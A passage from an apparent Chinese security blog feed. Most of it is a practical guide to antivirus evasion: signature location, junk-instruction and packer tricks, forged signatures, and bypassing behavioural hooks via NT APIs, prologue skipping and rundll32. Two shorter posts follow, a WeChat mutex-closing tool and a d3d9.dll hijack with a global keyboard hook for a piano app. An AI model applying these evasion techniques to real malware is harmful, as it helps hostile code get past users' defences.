<p>然后继续测试另外的连锁条件，直到找到最后一个连锁条件，抹掉后，整个文件免杀了，则说明特征代码被定为完毕了，所以VIRTEST绝对可以精确的定位出所有的复合特征。这比文件分块定位法先进得多，更为科学。</p>
</blockquote>
<p>工具查找肯定是针对二进制文件（有源码的也编译后在检查）。</p>
<p>具体用过MYCCL（使用方法自行查找），确实比手工分割文件定位方便，也可以找到某些文件的特征码，但是有些时候可能会出现非常多非常多…的被杀文件分割，然后…崩溃了。</p>
<p>后来也用了virtest，感觉作者说的挺有道理，应该挺好用吧。然后试了试，确实感觉比MYCCL高大上多了，也可以定位到特征码，但是tmd改了之后怎么还是报呢，反正你可能会折腾很久…</p>
<h3 id="手工查找"><a href="#手工查找" class="headerlink" title="手工查找"></a>手工查找</h3><p>这里说的是针对有源码的（二进制就别想手工了…），方法非常简单。</p>
<ol>
<li>mian中屏蔽所有代码，编译，扫描。不报的话继续2，如果依然报毒，去5。</li>
<li>放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复2。直到定位到某个函数或者多个函数，进入3。</li>
<li>在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复2。</li>
<li>直到定位某段代码（无自定义内部调用），特征码在此。</li>
<li>是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从1开始。如果没有，那去找找PE头吧。</li>
</ol>
<p>大致流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. sub1 //未报</span><br><span class="line">2. sub1 sub2 //未报</span><br><span class="line">3. sub1 sub2 sub3 //报</span><br><span class="line">4. sub1 sub2 sub3(sub31) //未报</span><br><span class="line">5. sub1 sub2 sub3(sub31 sub32) //报</span><br><span class="line">6. sub1 sub2 sub3(sub31 sub32(sub321)) //报</span><br><span class="line">...</span><br><span class="line">直到找到某API调用，或者逻辑代码（没有自定义函数调用）</span><br></pre></td></tr></table></figure>
<p>此方法，虽然笨，但是定位特征码不会很慢，挺准确。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>别找了，直接盲免杀吧（后面具体看，有效）</p>
<h2 id="2-怎么免杀？"><a href="#2-怎么免杀？" class="headerlink" title="2. 怎么免杀？"></a>2. 怎么免杀？</h2><p>前面已经找到特征码了，怎么免杀呢？</p>
<p>其实前面已经说到了，找到特征码之后，只要改变这个特征码值得话就免杀成功。如果不需要软件正常运行，直接填零得了…开玩笑，这怎么可能。所以修改特征码还得保证软件正常功能。所以也是有讲究的。</p>
<p>常用的修改工具有，OD，C32ASM，UE，010Editor等等。</p>
<h3 id="手工修改"><a href="#手工修改" class="headerlink" title="手工修改"></a>手工修改</h3><h4 id="非源码"><a href="#非源码" class="headerlink" title="非源码"></a>非源码</h4><p><strong>1. 数据</strong></p>
<p>如果特征码定位到数据（通过IDA/OD等确认），其实不好修改，稍微不慎就会导致程序不能运行，或者影响程序运行流程或结果。</p>
<ul>
<li>字符串，如果不影响程序逻辑，可以替换大小写；如果无关紧要的数据，随意替换；等等，看情况而定。</li>
<li>整数，如果不影响结果，替换值，清零等等操作。</li>
<li>地址，基本应该不能修改，具体看情况。</li>
<li>PE头数据，根据PE结构具体来看，无用数据清零或修改，有用数据看情况修改。</li>
<li>最后，终极修改方法，找到访问数据的代码，直接修改代码访问数据的地址，数据也可以放到其他地址了，其实就如同修改源码一样修改，肯定没有修改源码那么容易（见后）。</li>
</ul>
<p>反正特征码定位到数据位置不容易修改（可以再试试后面的盲免杀）。</p>
<p><strong>2. 代码</strong></p>
<p>如果特征码定位到代码（也通过IDA/OD等确认），在不改变程序功能基础上，应用各种方法修改。</p>
<ul>
<li>等价替换汇编代码，如mov eax，0可以换成xor eax，eax，直接结果相同，二进制代码不同。</li>
<li>交换代码顺序，在不影响逻辑的情况下。</li>
<li>代码块移位，将代码块移动不用的内存位置，通过加入jmp addr跳过去执行，addr是新的代码块地址。</li>
</ul>
<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>在有源码的情况下，修改的方式就更灵活了，更简单了。</p>
<ul>
<li><p>如果特征码是数据，那么修改数据位置，访问数据的代码位置等（思想类比非源码方式）。</p>
</li>
<li><p>加花指令，这是最有效也是最常用的方式，要点在于如何加话指令。</p>
</li>
</ul>
<ol>
<li>加数据计算代码，加减乘除各类组合。</li>
<li>加字符串操作代码，增加、删除、查找、替换等。</li>
<li>加多层跳转，跳转间加无效指令（不会执行的）。</li>
<li>加貌似有效的API调用，如LoadLibrary+GetProcAddr+API等。</li>
<li>等等。</li>
</ol>
<h3 id="工具免杀（盲免杀）"><a href="#工具免杀（盲免杀）" class="headerlink" title="工具免杀（盲免杀）"></a>工具免杀（盲免杀）</h3><p>在没找到有效的特征码，或者不好修改的时候，可以试试这种方式。</p>
<h4 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h4><p><strong>1. 加资源</strong></p>
<p>使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。</p>
<p><strong>2. 替换资源</strong></p>
<p>使用ResHacker替换无用的资源（Version等）。</p>
<p><strong>3. 加签名</strong></p>
<p>使用签名伪造工具，将正常软件的签名信息加入到自己软件中。</p>
<p>几种方式可以交替重复多次进行组合使用。</p>
<h4 id="PE操作"><a href="#PE操作" class="headerlink" title="PE操作"></a>PE操作</h4><p><strong>1. PE优化</strong></p>
<p>使用PE优化工具对文件进行优化，删除0，PE头优化，附加数据等。</p>
<p><strong>2. 增加节</strong></p>
<p>增加节数据，随意加入无效数据。</p>
<h4 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h4><p>可以将加壳简单理解为：解密器/解压器+加密器/压缩器（原始代码）。</p>
<p>通过加密器/压缩器将原始代码进行加密压缩，让其特征码变化隐藏，然后组装上解密器/解压器到文件中，运行是先运行解密/解压器，将加密压缩内容解密解压，然后继续运行原始代码。</p>
<p><strong>1. 加冷门壳</strong></p>
<p>壳也有特征，知名壳都已经被分析的非常多了，杀软基本都能查这类壳，或者自动脱壳，然后进行查杀。</p>
<p>所以加冷门壳，壳特征未被分析，不能自动脱壳，可以更好隐藏原始代码，得到免杀效果。</p>
<p><strong>2. 加壳改壳</strong></p>
<p>将常用壳进行修改，让壳特征变化，也可以是杀软失效。</p>
<p>比如修改入口，区段信息修改，入口代码移位。</p>
<p>可以类比为免杀壳，上面介绍的方法都可以使用。</p>
<h1 id="03-行为动态免杀"><a href="#03-行为动态免杀" class="headerlink" title="03. 行为动态免杀"></a>03. 行为动态免杀</h1><p>杀毒软件现在都会有主防的功能，对恶意行为进行拦截提示。</p>
<p>比如这些行为：</p>
<ol>
<li>注册表操作，添加启动项，添加服务</li>
<li>文件写入、读系统文件、删除文件，移动文件</li>
<li>杀进程，创建进程</li>
<li>注入、劫持等</li>
</ol>
<h2 id="行为拦截原理"><a href="#行为拦截原理" class="headerlink" title="行为拦截原理"></a>行为拦截原理</h2><p>说白了，恶意行为都是通过API调用来完成的，可能是一个API，可能是多个APi组合。</p>
<p>杀软通过技术手段拦截这些API调用，通过策略来判断是否属于恶意行为。</p>
<p>关键点：</p>
<ol>
<li>API</li>
<li>策略（顺序，调用源，参数等等）</li>
</ol>
<p>所以后面的方法就是针对这两点做的工作。</p>
<h2 id="如何进行行为免杀呢？"><a href="#如何进行行为免杀呢？" class="headerlink" title="如何进行行为免杀呢？"></a>如何进行行为免杀呢？</h2><p>下面介绍的方式对非源码、源码都有效，但是非源码修改起来非常非常麻烦…</p>
<p><strong>1. 替换api</strong></p>
<p>使用相同功能的API进行替换，杀软不可能拦截了所有API，所以这种方式还是有效的。比如MoveFileEx替换MoveFile。</p>
<p><strong>2. 未导出api</strong></p>
<p>寻找相同功能的未导出API进行替换，杀软拦截一般是导出API，或者底层调用，寻找未导出API有一定效果。</p>
<p>寻找方法，通过分析目标API内部调用，找到内部一个或多个未导出API，来完成相同功能。</p>
<p><strong>3. 重写api</strong></p>
<p>完全重写系统API功能（通过逆向），实现自己的对应功能API，对于ring3的行为拦截非常有效。比如实现MoveFile等。</p>
<p><strong>4. api+5</strong></p>
<p>ring3的API拦截通过是挂钩API头几个字节内容，然后进入杀软自己函数进行参数检查之类的。</p>
<p>那么如果调用API时，跳过头部几字节，就可以避开这种拦截方式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__API:</span><br><span class="line">1 push ebp;</span><br><span class="line">2 mov ebp, esp;</span><br><span class="line">3 mov edi, edi;</span><br><span class="line">4 ...</span><br></pre></td></tr></table></figure>
<p>调用时，不适用1地址，而使用4地址，然后自己函数内部还原跳过几字节的调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__API_MY:</span><br><span class="line">push ebp;</span><br><span class="line">mov ebp, esp;</span><br><span class="line">mov edi, edi;</span><br><span class="line">call 4</span><br></pre></td></tr></table></figure>
<p><strong>5. 底层api</strong></p>
<p>该方法类似于2和3，杀软拦截API可能更加高层（语义更清楚），那就可以找更底层API进行调用，绕过拦截，比如使用NT函数。</p>
<p>或者通过DeviceIoControl调用驱动功能来完成API功能。</p>
<p>模拟系统调用。</p>
<p><strong>6. 合理替换调用顺序</strong></p>
<p>有时拦截行为是通过多个API组合来完成的，所以合理替换顺序，绕过杀软拦截策略，也可以绕过改行为拦截。</p>
<p>比如，先创建服务，再将服务对应文件拷贝过去。</p>
<p><strong>7. 绕过调用源</strong></p>
<p>通过调用其它进行功能来完成API的功能。比较经典的如，通过rundll32.exe来完成dll加载，通过COM来操作文件等等。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>方法大概就总结到这，要更好的完成免杀，需要各种方式进行合理灵活组合变化，或者挖掘更多的方法。</p>
<h2 id="注意-技巧"><a href="#注意-技巧" class="headerlink" title="注意/技巧"></a>注意/技巧</h2><ol>
<li>非源码修改时，通过OD能够更好的完成，配合IDA进行观察，具体参考OD/IDA使用教程。</li>
<li>源码免杀加花，要灵活多变，不拘于形式。</li>
<li>行为免杀多尝试，猜出杀软拦截策略，能够更有效的找到绕过方式。</li>
</ol>
<blockquote>
<p>道高一尺，魔高一丈</p>
</blockquote>
<p>各路大神有更多的技巧和方式，请不吝赐教，相互交流。</p>
<p>我们不做坏事，但是可以了解做坏事的手段，更好的破坏防御这些手段。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://blog.csdn.net/cwqbuptcwqbupt/article/details/7591818" target="_blank" rel="noopener">模糊哈希算法的原理与应用</a></li>
<li><a href="http://www.freebuf.com/sectool/40580.html" target="_blank" rel="noopener">VirTest5.0特征码定位器（开源）</a></li>
<li><a href="http://baike.baidu.com/link?url=ExY1OF52Md1Lk6G_WMZQf4fdswE2RSjuhPmXEYRwgVhkSIb-udf0AhK1cqbhmnDsnf21pUJSvHEWnMoxwZfZ5asnxw0W76Ew9t5ZIJRbLxO" target="_blank" rel="noopener">http://baike.baidu.com/link?url=ExY1OF52Md1Lk6G_WMZQf4fdswE2RSjuhPmXEYRwgVhkSIb-udf0AhK1cqbhmnDsnf21pUJSvHEWnMoxwZfZ5asnxw0W76Ew9t5ZIJRbLxO</a></li>
</ol>
<p>转载请注明出处：<a href="https://anhkgg.github.io/aanti-virus">https://anhkgg.github.io/aanti-virus</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-概述&quot;&gt;&lt;a href=&quot;#00-概述&quot; class=&quot;headerlink&quot; title=&quot;00. 概述&quot;&gt;&lt;/a&gt;00. 概述&lt;/h1&gt;&lt;p&gt;什么是免杀？来自百科的注解：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;免杀，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有本比较有名的书，想详细学习的同学可以去看看。《黑客免杀攻防》&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;其实我大概好像只看过目录…( ╯□╰ )&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下面我介绍的是自己实践的一些方法，有没有效果，试试就知道了。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
    
    
      <category term="Anti-AntiVirus" scheme="https://anhkgg.github.io/tags/Anti-AntiVirus/"/>
    
      <category term="免杀" scheme="https://anhkgg.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="AntiVirus" scheme="https://anhkgg.github.io/tags/AntiVirus/"/>
    
      <category term="杀毒软件" scheme="https://anhkgg.github.io/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>微信(WeChat)电脑端多开研究+源码</title>
    <link href="https://anhkgg.github.io/wechat-multi-pc/"/>
    <id>https://anhkgg.github.io/wechat-multi-pc/</id>
    <published>2017-05-14T07:07:51.000Z</published>
    <updated>2018-10-09T09:32:02.687Z</updated>
    
    <content type="html"><![CDATA[<p>欢迎关注技术公众号：<strong>汉客儿</strong></p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>不知道大家有没有多个微信号，我反正有一两三个。</p>
<p>现在电脑端微信使用频率也比较高，主要用于大文件传输，或者手机电脑文件互传等等，除了不能收红包和看朋友圈，貌似电脑端没其他毛病。</p>
<p>哦，还有个毛病，只能开一个微信，只能开一个，开一个，一个…</p>
<p>不管这些有的没的，今天的主题是，怎么样在电脑上开多个微信客户端！</p>
<a id="more"></a>
<h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>了解过单实例的同学，应该都知道大概是怎么实现的单开。</p>
<p>简单说下，大都通过判断Mutex、Event、File等等是否已经存在，存在则退出当前开启进程（说明已经有一个进程了），这样也就是单实例了。</p>
<p>那只要找到微信是通过什么标志来实现单实例的，然后干掉这个标志即可。</p>
<p>然后…基于这个思路，我们上工具。</p>
<p>使用procexp找到微信进程，然后翻了一遍句柄。</p>
<p>找到疑是的一段句柄。</p>
<p><img src="/img/webchat.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\Sessions\1\BaseNamedObjects\_WeChat_App_Instance_Identity_Mutex_Name</span><br><span class="line">\Sessions\1\BaseNamedObjects\WeChat_GlobalConfig_Multi_Process_Mutex</span><br></pre></td></tr></table></figure>
<p>感觉这两个都像，不管了，上pchunter，kill掉句柄试一下。</p>
<p>经过尝试，发现<code>_WeChat_App_Instance_Identity_Mutex_Name</code>是单实例标志（kill句柄后可以开第二个客户端），<code>WeChat_GlobalConfig_Multi_Process_Mutex</code>没用。</p>
<p>既然如此，那开始码代码吧。</p>
<h1 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h1><p>可能的方案：</p>
<ol>
<li>找微信判断标识的代码位置，然后直接patch掉，或者整个dll进去patch。然后大致去翻了一下，貌似代码在wechatwin.dll，然后加了vmp壳，所以就不折腾这个了。</li>
<li>直接通过代码kill掉这个Mutex的句柄（类似Pchunter操作），然后就可以开启第二个实例了，貌似明显更有优势啊。</li>
<li>额，如果觉得无所谓，每次开之前用pchunter关一次句柄也行，下面就不用看了…</li>
</ol>
<p>这里选择第二个方案，开始代码。</p>
<p>流程：</p>
<ol>
<li>枚举句柄，找到_WeChat_App_Instance_Identity_Mutex_Name的mutant</li>
<li>duplicate句柄到本进程，然后close</li>
<li>启动微信</li>
</ol>
<p>下面是主要代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">//步骤1和2的代码</span><br><span class="line">//获取到微信所有进程句柄</span><br><span class="line">DWORD Num = GetProcIds(L&quot;WeChat.exe&quot;, Pids);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Status = ZwQuerySystemInformation(SystemHandleInformation, pbuffer, 0x1000, &amp;dwSize);</span><br><span class="line"></span><br><span class="line">PSYSTEM_HANDLE_INFORMATION1 pHandleInfo = (PSYSTEM_HANDLE_INFORMATION1)pbuffer;</span><br><span class="line"></span><br><span class="line">	for(nIndex = 0; nIndex &lt; pHandleInfo-&gt;NumberOfHandles; nIndex++)</span><br><span class="line">	&#123;</span><br><span class="line">	    //句柄在Pids中，就是微信进程的句柄信息</span><br><span class="line">		if(IsTargetPid(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, Pids, Num))</span><br><span class="line">		&#123;</span><br><span class="line">		    HANDLE hHandle = DuplicateHandleEx(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, </span><br><span class="line">						(HANDLE)pHandleInfo-&gt;Handles[nIndex].HandleValue,</span><br><span class="line">						DUPLICATE_SAME_ACCESS</span><br><span class="line">						);</span><br><span class="line">						</span><br><span class="line">			//对象名</span><br><span class="line">			Status = NtQueryObject(hHandle, ObjectNameInformation, szName, 512, &amp;dwFlags);</span><br><span class="line">			//对象类型名</span><br><span class="line">			Status = NtQueryObject(hHandle,  ObjectTypeInformation, szType, 128, &amp;dwFlags);</span><br><span class="line">			</span><br><span class="line">			//找到微信的标志</span><br><span class="line">			if (0 == wcscmp(TypName, L&quot;Mutant&quot;))</span><br><span class="line">			&#123;</span><br><span class="line">				if (wcsstr(Name, L&quot;_WeChat_App_Instance_Identity_Mutex_Name&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">				    </span><br><span class="line">				    //DUPLICATE_CLOSE_SOURCE标志很重要，不明白的查一查</span><br><span class="line">    				hHandle = DuplicateHandleEx(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, </span><br><span class="line">						(HANDLE)pHandleInfo-&gt;Handles[nIndex].HandleValue,</span><br><span class="line">						DUPLICATE_CLOSE_SOURCE</span><br><span class="line">						);</span><br><span class="line">					if(hHandle)</span><br><span class="line">					&#123;</span><br><span class="line">						printf(&quot;+ Patch wechat success!\n&quot;);</span><br><span class="line">						CloseHandle(hHandle);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">步骤3的代码</span><br><span class="line"></span><br><span class="line">//通过注册表找到微信安装目录</span><br><span class="line">if(ERROR_SUCCESS != RegOpenKey(HKEY_CURRENT_USER, L&quot;Software\\Tencent\\WeChat&quot;, &amp;hKey))</span><br><span class="line">&#123;</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD Type = REG_SZ;</span><br><span class="line">WCHAR Path[MAX_PATH] = &#123;0&#125;;</span><br><span class="line">DWORD cbData = MAX_PATH*sizeof(WCHAR);</span><br><span class="line">if(ERROR_SUCCESS != RegQueryValueEx(hKey, L&quot;InstallPath&quot;, 0, &amp;Type, (LPBYTE)Path, &amp;cbData))</span><br><span class="line">&#123;</span><br><span class="line">	goto __exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PathAppend(Path, L&quot;WeChat.exe&quot;);</span><br><span class="line"></span><br><span class="line">//启动微信客户端</span><br><span class="line">ShellExecute(NULL, L&quot;Open&quot;, Path, NULL, NULL, SW_SHOW);</span><br></pre></td></tr></table></figure>
<p>代码就这样，有注释，就不再啰嗦。</p>
<p>完整代码，请看后面的地址。</p>
<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>一个小玩意，供大家一笑。</p>
<p>编译好的可执行文件：</p>
<p><a href="https://github.com/anhkgg/multi_wechat_pc/raw/master/WeChat%E5%A4%9A%E5%BC%80.exe" target="_blank" rel="noopener">https://github.com/anhkgg/multi_wechat_pc/raw/master/WeChat%E5%A4%9A%E5%BC%80.exe</a></p>
<p>源码地址：</p>
<p><a href="https://github.com/anhkgg/multi_wechat_pc" target="_blank" rel="noopener">https://github.com/anhkgg/multi_wechat_pc</a></p>
<p>博客原文：</p>
<p><a href="https://anhkgg.github.io/wechat-multi-pc">https://anhkgg.github.io/wechat-multi-pc</a></p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/wechat-multi-pc">https://anhkgg.github.io/wechat-multi-pc</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;欢迎关注技术公众号：&lt;strong&gt;汉客儿&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;不知道大家有没有多个微信号，我反正有一两三个。&lt;/p&gt;
&lt;p&gt;现在电脑端微信使用频率也比较高，主要用于大文件传输，或者手机电脑文件互传等等，除了不能收红包和看朋友圈，貌似电脑端没其他毛病。&lt;/p&gt;
&lt;p&gt;哦，还有个毛病，只能开一个微信，只能开一个，开一个，一个…&lt;/p&gt;
&lt;p&gt;不管这些有的没的，今天的主题是，怎么样在电脑上开多个微信客户端！&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
    
    
      <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>
    
      <category term="handle" scheme="https://anhkgg.github.io/tags/handle/"/>
    
      <category term="patch" scheme="https://anhkgg.github.io/tags/patch/"/>
    
  </entry>
  
  <entry>
    <title>让代码飞出一段钢琴曲(freepiano小助手)</title>
    <link href="https://anhkgg.github.io/coding-piano-hook/"/>
    <id>https://anhkgg.github.io/coding-piano-hook/</id>
    <published>2017-05-01T07:11:42.000Z</published>
    <updated>2017-05-01T07:27:41.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>突然想玩一下键盘弹曲子，就找到了<a href="http://freepiano.tiwb.com/cn/" target="_blank" rel="noopener">freepiano</a>，专业的东西不懂，就找了写简谱来玩玩，感觉挺不错的，哈哈~~</p>
<p>玩疯了之后，突然想到，我平时写代码，是不是可以弹出一段曲子呢，是不是心情会变得非常好，代码也写的更有节奏呢~~</p>
<p>说不定还搞出来一个什么《代码之歌》的钢琴曲~~ 嘎嘎</p>
<p>突然被自己这个想法吸引住了，不管咋样，每敲下代码的一个字符，后面想起了背景音乐，真是不错的，程序员也可以是“钢琴师”啊~~</p>
<p>有了想法，就开整！！！</p>
<a id="more"></a>
<p>有下面几点问题：</p>
<ol>
<li>freepiano必须是激活窗口下，才能接受键盘输入</li>
<li>我要在写代码时，让freepiano响应按键，就需要全局劫持键盘输入了</li>
<li>怎么给freepiano通知，我按下了什么呢？</li>
</ol>
<p>忘了说，freepiano长这样：<br><img src="/img/freepiano_1.png" alt="img"></p>
<h1 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h1><p>先简单整理下思路：</p>
<ol>
<li>首先肯定是弄个键盘钩子难道全局的所有键盘输入，暂定WH_KEYBOARD</li>
<li>怎么让钩子执行？弄个exe，把freepiano再启动起来，感觉麻烦，然后就想让freepiano加载我的模块吧，简单确认了一下，可行（后面具体描述）</li>
<li>劫持到键盘输入之后，通过PostMessage给freepiano发送键盘消息，模拟WM_KEYDOWN/WM_KEYUP</li>
</ol>
<h2 id="1-加载我的模块"><a href="#1-加载我的模块" class="headerlink" title="1. 加载我的模块"></a>1. 加载我的模块</h2><p>首先想到的就是DLL劫持和修改freepiano的导入表，后者不够优雅，果断要选择dll劫持。</p>
<p>然后就用depends看了下freepiano的导入信息，发现几个可以劫持的（dsound.dll，d3d9.dll等），简单代码确认了一下，freepiano可以劫持这两个模块，选择了d3d9.dll（函数少）。</p>
<p><img src="/img/freepiano_2.png" alt="img"></p>
<p>然后偷懒用了aheadlib导出了d3d9.dll的导出函数信息，简单方便，飞快得就搞定了劫持。</p>
<p>代码很简单，就贴一点（都不需要手写）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 导出函数</span><br><span class="line">#pragma comment(linker, &quot;/EXPORT:Direct3DShaderValidatorCreate9=_AheadLib_Direct3DShaderValidatorCreate9,@1&quot;)</span><br><span class="line">#pragma comment(linker, &quot;/EXPORT:PSGPError=_AheadLib_PSGPError,@2&quot;)</span><br><span class="line">#pragma comment(linker, &quot;/EXPORT:PSGPSampleTexture=_AheadLib_PSGPSampleTexture,@3&quot;)</span><br><span class="line">...</span><br><span class="line">// 导出函数</span><br><span class="line">ALCDECL AheadLib_Direct3DShaderValidatorCreate9(void)</span><br><span class="line">&#123;</span><br><span class="line">	// 保存返回地址</span><br><span class="line">	__asm POP m_dwReturn[0 * TYPE long];</span><br><span class="line"></span><br><span class="line">	// 调用原始函数</span><br><span class="line">	GetAddress(&quot;Direct3DShaderValidatorCreate9&quot;)();</span><br><span class="line"></span><br><span class="line">	// 转跳到返回地址</span><br><span class="line">	__asm JMP m_dwReturn[0 * TYPE long];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一试，OK，模块起来了，freepiano正常工作。</p>
<p><img src="/img/freepiano_3.png" alt="img">)</p>
<h2 id="2-安装钩子"><a href="#2-安装钩子" class="headerlink" title="2. 安装钩子"></a>2. 安装钩子</h2><p>选择了安装全局WH_KEYBOARD钩子，这个代码网上也太多了，就不细说了，看看就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//安装钩子</span><br><span class="line">BOOL Hook(HMODULE hMod)</span><br><span class="line">&#123;</span><br><span class="line">	g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hMod, 0);</span><br><span class="line">	return g_Hook?TRUE:FALSE;</span><br><span class="line">&#125;</span><br><span class="line">//卸载钩子</span><br><span class="line">VOID Unhook()</span><br><span class="line">&#123;</span><br><span class="line">	if(g_Hook)</span><br><span class="line">	&#123;</span><br><span class="line">		UnhookWindowsHookEx(g_Hook);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">//钩子函数，劫持键盘消息</span><br><span class="line">LRESULT CALLBACK KeyboardProc(  int code,       // hook code</span><br><span class="line">							  WPARAM wParam,  // virtual-key code</span><br><span class="line">							  LPARAM lParam   // keystroke-message information</span><br><span class="line">							  )</span><br><span class="line">&#123;	</span><br><span class="line">	if(code == HC_ACTION)</span><br><span class="line">	&#123;</span><br><span class="line">		SendKeyMsg(wParam, lParam);</span><br><span class="line">	&#125;</span><br><span class="line">	return CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
